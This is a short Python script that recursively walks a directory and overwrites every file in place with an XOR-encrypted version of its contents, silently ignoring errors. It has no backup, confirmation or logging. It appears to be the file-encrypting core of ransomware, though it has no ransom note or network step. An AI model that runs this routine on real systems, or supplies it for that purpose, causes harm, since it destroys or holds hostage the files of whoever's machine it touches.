import os

def xor_encrypt_decrypt(data: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

def encrypt_directory(path, key):
    for root, _, files in os.walk(path):
        for fname in files:
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, 'rb') as f:
                    content = f.read()
                encrypted = xor_encrypt_decrypt(content, key)
                with open(fpath, 'wb') as f:
                    f.write(encrypted)
            except Exception:
                pass  # Ignore files that can't be read
